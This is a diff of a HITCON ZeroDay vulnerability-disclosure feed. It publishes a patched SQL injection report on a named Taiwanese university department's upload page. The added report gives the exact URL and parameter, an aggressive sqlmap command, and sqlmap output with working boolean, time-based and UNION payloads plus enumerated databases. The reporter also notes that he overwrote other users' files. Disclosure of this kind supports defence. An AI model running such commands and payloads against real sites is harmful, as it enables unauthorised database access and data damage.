@@ -3135,7 +3135,7 @@
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="075747747470377563" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="ffafbf8c8c88cf8d9b" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3200,7 +3200,7 @@
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="c79787b4b4b0f7b5a3">
+      <span class="__cf_email__" data-cfemail="beeefecdcdc98eccda">
        [email protected]
       </span>
      </a>
@@ -4341,7 +4341,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Tue, 05 Apr 2022 14:31:20 GMT</pubDate></item><item><title> 某單位  存在 SQL injection</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00243</link><description><div class="container">
+</description><pubDate>Tue, 05 Apr 2022 14:31:20 GMT</pubDate></item><item><title>國立臺北科技大學電機工程系 存在 SQL injection</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00243</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -4359,12 +4359,25 @@
       ZD-2022-00243
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/1019">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      國立臺北科技大學電機工程系
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      某單位  存在 SQL injection
+      國立臺北科技大學電機工程系 存在 SQL injection
      </span>
     </li>
     <li class="intro">
@@ -4387,10 +4400,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/04/12
+    Last Update : 2022/04/16
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-high">
     <li class="">
@@ -4429,7 +4442,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -4438,7 +4451,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -4531,6 +4544,17 @@
       確認已修補 (由 entroy 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/04/16 03:00:09
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -4559,6 +4583,124 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - SQL Injection
+    <br/>
+    https://www.owasp.org/index.php/SQL_Injection
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
+    <br/>
+    <br/>
+    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+    <br/>
+    https://cwe.mitre.org/data/definitions/89.html
+    <br/>
+    <br/>
+    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
+    <br/>
+    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://www.ee.ntut.edu.tw/uploadfile/upload.php?isn=27
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <h1>
+     SQLi
+    </h1>
+    <ul>
+     <li>
+      參數 isn 存在 SQL injection，以 sqlmap 驗證
+      <pre><code>sqlmap https://www.ee.ntut.edu.tw/uploadfile/upload.php\?isn\=27 -p isn --level 5 --risk 3 --batch --random-agent</code></pre>
+     </li>
+     <li>
+      <p>
+       result
+      </p>
+      <pre><code>---
+Parameter: isn (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: isn=27 AND 4260=4260
+
+Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: isn=27 AND (SELECT 7937 FROM (SELECT(SLEEP(5)))Nkal)
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 6 columns
+Payload: isn=-1445 UNION ALL SELECT NULL,CONCAT(0x7176717071,0x4c7a4c426374596b744f4a414445654e55424b546e6c6c6d66686a7a56677444714b5a754e535758,0x71766b7671),NULL,NULL,NULL,NULL-- -
+---
+[00:27:21] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL &gt;= 5.0.12</code></pre>
+      <p>
+       <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7406/attachments/41450cf751481df839a5b17204ba8960"/>
+      </p>
+     </li>
+     <li>
+      dbs
+      <pre><code>available databases [2]:
+[*] information_schema
+[*] uploadfile</code></pre>
+      <p>
+       <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7406/attachments/61b656a76b3dad7eff2496b8ca609624"/>
+      </p>
+     </li>
+     <li>
+      p.s. 有點不好意思 把其他考生的檔案覆寫掉了，所以可能要稍微檢查一下檔案的部分
+     </li>
+    </ul>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7406/attachments/41450cf751481df839a5b17204ba8960" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7406/attachments/61b656a76b3dad7eff2496b8ca609624" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -4571,6 +4713,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/1019">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
@@ -11319,7 +11480,7 @@
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="f9a9b98a8a8ec98b9d" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="83d3c3f0f0f4b3f1e7" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -11384,7 +11545,7 @@
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="114151626266216375">
+      <span class="__cf_email__" data-cfemail="035343707074337167">
        [email protected]
       </span>
      </a>
